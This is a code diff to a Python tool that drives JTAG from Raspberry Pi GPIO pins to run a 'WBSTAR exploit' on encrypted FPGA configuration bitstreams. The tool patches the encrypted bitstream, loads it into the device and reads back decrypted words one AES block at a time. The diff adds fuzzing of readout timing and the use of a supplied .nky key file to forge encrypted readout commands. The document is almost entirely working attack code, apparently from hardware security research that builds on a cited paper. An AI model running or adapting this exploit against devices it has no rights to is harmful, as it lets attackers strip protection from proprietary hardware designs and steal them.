@@ -12,6 +12,7 @@ import subprocess
 import logging
 import sys
 import binascii
+from Crypto.Cipher import AES
 
 from enum import Enum
 
@@ -64,6 +65,11 @@ keepalive = []
 compat = False
 readout = False
 readdata = 0
+use_key = False
+nky_key = ''
+nky_iv = ''
+nky_hmac =''
+use_fuzzer = False
 
 def phy_sync(tdi, tms):
     global TCK_pin, TMS_pin, TDI_pin, TDO_pin
@@ -405,6 +411,7 @@ def bitflip(data_block, bitwidth=32):
 
 def do_wbstar(ifile, offset):
     global readdata
+    global use_key, nky_key, nky_iv, nky_hmac, use_fuzzer
     
     if offset < 1:
         print("Offset {} is too small. Must be greater than 0.".format(offset))
@@ -453,76 +460,187 @@ def do_wbstar(ifile, offset):
         recovered = [0,0,0,0]
         block = [0,0,0,0]
 
-        for word_index in range(0, 4):
-           # copy attack area as template
-           attack_area = binfile[sync_pos:cipherstart + 0x98*4] # from HMAC header to end of "configuration footer"
-           attack_cipherstart = cipherstart - sync_pos # subtract out the sync_pos offset
+        if use_fuzzer:
+            fuzz_min = 0
+            fuzz_max = 0x98
+        else:
+            fuzz_min = 126 # determined through fuzzing
+            fuzz_max = 127
 
-           # mutate the WBSTAR write length
-           # 0xD selects the third word in the AES block; 0x1 is there originally, so much XOR that out
-           wbstar_patch = 0xd - word_index
-           attack_area[attack_cipherstart + 0x3b] = attack_area[attack_cipherstart + 0x3b] ^ wbstar_patch ^ 0x1
+        for ro_fuzz in range(fuzz_min, fuzz_max):
+           for word_index in range(0, 4):
+              # copy attack area as template
+              attack_area = binfile[sync_pos:cipherstart + 0x98*4] # from HMAC header to end of "configuration footer"
+              attack_cipherstart = cipherstart - sync_pos # subtract out the sync_pos offset
 
-           # copy in the IV + target block
-           dest = attack_cipherstart + 6*16  # 6x 16-byte AES blocks
-           for source in range( sync_pos + attack_cipherstart + (offset-1)*16,
-                                sync_pos + attack_cipherstart + (offset+1)*16 ):
-               attack_area[dest] = binfile[source]
-               dest = dest + 1
+              # mutate the WBSTAR write length
+              # 0xD selects the third word in the AES block; 0x1 is there originally, so much XOR that out
+              wbstar_patch = 0xd - word_index
+              attack_area[attack_cipherstart + 0x3b] = attack_area[attack_cipherstart + 0x3b] ^ wbstar_patch ^ 0x1
 
-           # patch in 0x2000_0000 (NOP) command over words as they are decrypted to prevent errant commands to fabric
-           for patch in range(0, word_index):
-               attack_area[attack_cipherstart + 0x6c - 4*patch] ^= (((recovered[3-patch] >> 24) & 0xff) ^ 0x20)
-               attack_area[attack_cipherstart + 0x6d - 4*patch] ^= (((recovered[3-patch] >> 16) & 0xff) ^ 0x00)
-               attack_area[attack_cipherstart + 0x6e - 4*patch] ^= (((recovered[3-patch] >>  8) & 0xff) ^ 0x00)
-               attack_area[attack_cipherstart + 0x6f - 4*patch] ^= (((recovered[3-patch] >>  0) & 0xff) ^ 0x00)
+              # copy in the IV + target block
+              dest = attack_cipherstart + 6*16  # 6x 16-byte AES blocks
+              for source in range( sync_pos + attack_cipherstart + (offset-1)*16,
+                                   sync_pos + attack_cipherstart + (offset+1)*16 ):
+                  attack_area[dest] = binfile[source]
+                  dest = dest + 1
 
-           # attack_area now contains the data to configure
-           debug = False
-           if debug:
-               i = 0
-               for b in attack_area:
-                   if i % 32 == 0:
-                       print(" ")
-                   i = i + 1
-                   print("{:02x} ".format(b), end='')
-               print(" ")
-               with open("check{}.bin".format(word_index), "wb") as check:
-                   check.write(attack_area)
-           # run the attack
-           attack_bits = bin(int.from_bytes(attack_area, byteorder='big'))[2:]
-           jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
-           jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
-           jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
-           jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
-           jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
-           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
-           jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
-           jtag_legs.append([JtagLeg.DRC, attack_bits, 'attack_data'])
-           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
-           jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
-           jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
+              # patch in 0x2000_0000 (NOP) command over words as they are decrypted to prevent errant commands to fabric
+              for patch in range(0, word_index):
+                  attack_area[attack_cipherstart + 0x6c - 4*patch] ^= (((recovered[3-patch] >> 24) & 0xff) ^ 0x20)
+                  attack_area[attack_cipherstart + 0x6d - 4*patch] ^= (((recovered[3-patch] >> 16) & 0xff) ^ 0x00)
+                  attack_area[attack_cipherstart + 0x6e - 4*patch] ^= (((recovered[3-patch] >>  8) & 0xff) ^ 0x00)
+                  attack_area[attack_cipherstart + 0x6f - 4*patch] ^= (((recovered[3-patch] >>  0) & 0xff) ^ 0x00)
 
-           while len(jtag_legs):
-              jtag_next()
+              # attack_area now contains the data to configure
+              debug = False
+              if debug:
+                  i = 0
+                  for b in attack_area:
+                      if i % 32 == 0:
+                          print(" ")
+                      i = i + 1
+                      print("{:02x} ".format(b), end='')
+                  print(" ")
+                  with open("check{}.bin".format(word_index), "wb") as check:
+                      check.write(attack_area)
+              # run the attack
+              attack_bits = bin(int.from_bytes(attack_area, byteorder='big'))[2:]
+              jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
+              jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
+              jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
+              jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
+              jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
+              jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+              jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
+              jtag_legs.append([JtagLeg.DRC, attack_bits, 'attack_data'])
+              jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+              jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
+              jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
 
-           # now perform the readout
-           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
-           jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
-           jtag_legs.append([JtagLeg.DRC, bin(0xaa99556620000000280200012000000020000000)[2:], 'readout_command'])
-           # command as from Ender paper
-           #jtag_legs.append([JtagLeg.DRC, bin(0xffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000)[2:], 'readout_command'])
-           jtag_legs.append([JtagLeg.IR, '000100', 'cfg_out'])
-           jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
-           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
-           jtag_legs.append([JtagLeg.IR, '010100', 'noop'])
+              while len(jtag_legs):
+                 jtag_next()
 
-           while len(jtag_legs):
-              jtag_next()
+              if use_key:
+                  key_bytes = int(nky_key, 16).to_bytes(32, byteorder='big')
+                  logging.debug("key: %s", binascii.hexlify(key_bytes))
+                  with open(ifile, "rb") as ro:
+                       ro_bytes = bytearray(ro.read())
+                       ro_pos = 0
+                       ro_sync_pos = 0
+                       while ro_pos < len(ro_bytes):
+                           cwd = int.from_bytes(ro_bytes[ro_pos:ro_pos+4], 'big')
+                           if cwd == 0xaa995566:
+                               ro_sync_pos = ro_pos
+                           if cwd == 0x30034001:
+                               break
+                           if cwd == 0x30016004:
+                               ro_iv_pos = ro_pos+4
+                           ro_pos = ro_pos + 1
+                       ro_desired_len = 0x98 # 0x10
+                       ro_pos = ro_pos + 4
+                       ro_bytes[ro_pos+0] = 0x0
+                       ro_bytes[ro_pos+1] = 0x0
+                       ro_bytes[ro_pos+2] = 0x0
+                       ro_bytes[ro_pos+3] = ro_desired_len
+                       ro_cipherstart = ro_pos+4
+                       ro_iv_bytes = bitflip(ro_bytes[ro_iv_pos : ro_iv_pos+0x10])
+                       logging.debug("recovered ro iv: %s", binascii.hexlify(ro_bytes[ro_iv_pos : ro_iv_pos+0x10]))
+                       logging.debug("recovered ro iv (flipped): %s", binascii.hexlify(ro_iv_bytes))
 
-           logging.debug("Recovered word: 0x%s", hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')))
-           recovered[3-word_index] = readdata
-           block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')
+                       ro_area = ro_bytes[ro_sync_pos:ro_cipherstart + ro_desired_len*4]
+
+                       cipher = AES.new(key_bytes, AES.MODE_CBC, ro_iv_bytes)
+
+                       if False:  # these are static readout bitstreams, not used but kept around for future reference
+                           # code is 512 bits long
+                           if True:
+                                readout_code = 0xaa995566200000002802000120000000200000002000000020000000200000002000000020000000200000002000000020000000200000002000000020000000
+                                readout_len = 64
+                           else:
+                                readout_code = 0x2000000020000000ffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000
+                                readout_len = 96
+
+                           readout_pad = ro_desired_len - readout_len//4
+
+                           plaintext = bytearray()
+                           plaintext += bytearray(readout_code.to_bytes(readout_len, byteorder='big'))
+                           for i in range(0, readout_pad):
+                               plaintext += int(0x20000000).to_bytes(4, byteorder='big')
+                       else: # dynamically generate the readout bitstream to fuzz the timing
+                           read_wbstar = 0x28020001 # wbstar 0x28020001 / idcode 0x28018001
+                           nop         = 0x20000000
+                           sync        = 0xaa995566
+                           plaintext = bytearray()
+                           for i in range(0, ro_desired_len):
+                               if i == 0:
+                                   plaintext += int(sync).to_bytes(4, byteorder='big')
+                               elif i == ro_desired_len - ro_fuzz:
+                                   plaintext += int(read_wbstar).to_bytes(4, byteorder='big')
+                               else:
+                                   plaintext += int(nop).to_bytes(4, byteorder='big')
+
+                       readout_crypt = bitflip(cipher.encrypt(bitflip(plaintext)))
+                       i = ro_cipherstart - ro_sync_pos
+                       for b in readout_crypt:
+                           ro_area[i] = b
+                           i = i + 1
+
+                       readout_cmd = bin(int.from_bytes(ro_area, byteorder='big'))[2:]
+                       i = 0
+                       if debug:
+                           for b in ro_area:
+                               if i % 32 == 0:
+                                   print(" ")
+                               i = i + 1
+                               print("{:02x} ".format(b), end='')
+                           print(" ")
+                           with open("check-ro.bin".format(word_index), "wb") as check:
+                              check.write(ro_area)
+                              
+                       jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
+                       jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
+                       #jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
+                       #jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
+                       #jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
+                       #jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+                       jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
+                       jtag_legs.append([JtagLeg.DRC, readout_cmd, 'readout_command'])
+                       jtag_legs.append([JtagLeg.IRD, '000100', 'cfg_out'])
+                       jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
+                       jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+                       jtag_legs.append([JtagLeg.IR, '010100', 'noop'])
+
+                       while len(jtag_legs):
+                          jtag_next()
+
+                    
+                       print("Recovered word at {}: {}".format(ro_fuzz, hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big'))))
+                       recovered[3-word_index] = readdata
+                       block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')
+
+              else:
+                  ### preferred command
+                  readout_cmd = bin(0xaa99556620000000280200012000000020000000)[2:]
+                  ### command as from Ender paper
+                  # readout_cmd = bin(0xffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000)[2:]
+
+                  # now perform the readout
+                  jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+                  jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
+                  jtag_legs.append([JtagLeg.DRC, readout_cmd, 'readout_command'])
+                  jtag_legs.append([JtagLeg.IR, '000100', 'cfg_out'])
+                  jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
+                  jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+                  jtag_legs.append([JtagLeg.IR, '010100', 'noop'])
+
+                  while len(jtag_legs):
+                     jtag_next()
+
+                  print("Recovered word at {}: {}".format(ro_fuzz, hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big'))))
+                  logging.debug("Recovered word: %s", hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')))
+                  recovered[3-word_index] = readdata
+                  block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')
 
         print('AES block {} is 0x{:08x}{:08x}{:08x}{:08x}'.format(offset, block[0], block[1], block[2], block[3]))
         
@@ -532,6 +650,7 @@ def main():
     global jtag_legs, jtag_results
     global gpio_pointer
     global compat
+    global use_key, nky_key, nky_iv, nky_hmac, use_fuzzer
 
     parser = argparse.ArgumentParser(description="Drive JTAG via Rpi GPIO")
     parser.add_argument(
@@ -541,7 +660,7 @@ def main():
         "-b", "--bitstream", default=False, action="store_true", help="input file is a bitstream, not a JTAG command set"
     )
     parser.add_argument(
-        "-w", "--wbstar", help="Decode one AES block  using WBSTAR exploit. Offset is specified in units of 128-bit blocks.", type=int
+        "-w", "--wbstar", help="Decode one AES block using WBSTAR exploit. Offset is specified in units of 128-bit blocks.", type=int
     )
     parser.add_argument(
         "-c", "--compat", default=False, action="store_true", help="Use compatibility mode (warning: about 100x slower than FFI)"
@@ -560,6 +679,12 @@ def main():
     )
     parser.add_argument(
         '--tck', type=int, help="Specify TCK GPIO. Defaults to 4", default=4
+    )
+    parser.add_argument(
+        "-i", "--input-key", help="Use specified .nky file to create readout command", type=str
+    )
+    parser.add_argument(
+        "-p", "--phuzz", help="Fuzz readout addresses on wbstar exploit with encrypted readout commands", default=False, action="store_true"
     )
     args = parser.parse_args()
     if args.debug:
@@ -585,6 +710,21 @@ def main():
         print("Compatibility mode triggered because one of tck/tdi/tdo/tms pins do not match the CFFI bindings")
         print("To fix this, edit gpio-ffi.c and change the #define's to match your bindings, and update the ")
         print("global defaults to the pins in this file, specified just after the imports.")
+
+    # extract the original key, HMAC, and IV
+    if args.input_key != None:
+        if args.phuzz:
+            use_fuzzer = True
+        with open(args.input_key, "r") as nky:
+            use_key = True
+            for lines in nky:
+                line = lines.split(' ')
+                if line[1] == '0':
+                    nky_key = line[2].rstrip().rstrip(';')
+                if line[1] == 'StartCBC':
+                    nky_iv = line[2].rstrip().rstrip(';')
+                if line[1] == 'HMAC':
+                    nky_hmac = line[2].rstrip().rstrip(';')
 
     rev = GPIO.RPI_INFO
     if rev['P1_REVISION'] == 1:
